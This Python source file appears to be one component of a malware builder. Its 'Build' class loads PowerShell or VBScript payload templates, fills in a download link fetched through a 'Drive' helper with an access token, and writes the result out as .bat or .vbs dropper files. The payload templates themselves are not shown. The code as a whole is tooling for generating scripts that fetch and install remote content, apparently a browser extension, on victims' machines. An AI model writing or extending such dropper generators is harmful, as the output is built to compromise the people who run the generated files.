
import os
from colors import Colors
from drive import Drive

class Build :

	def __init__(self, extension, filetype, token) :
		self.extension = extension
		self.filetype = filetype
		self.token = token
		self.color = Colors()

	def builder(self) :
		
		try:

			path = "output/builds/" # Builds files
			if self.filetype == "bat":
				payloads = "data/payloads/powershell/powershell.txt" # Payload file
			elif self.filetype == "vbs" :
				payloads = "data/payloads/VBScript/vbs.txt" # Payload file

			
		
			build = "{}.{}".format(self.extension, self.filetype) # Make .bat file

			with open(payloads, 'r') as f :

				# Set the drop URL or do not
				payload = f.read()

				if self.filetype == "bat":
					payload = payload.replace('***', Drive(self.extension, self.token).link())
					print("{} Execuable file in directory output/extension/{}".format(self.color.status("[+]"), self.extension))

				with open(os.path.join(path, build), 'w') as builder :
					# Write the new file
					builder.write(payload)
		except IOError as e:
			raise e

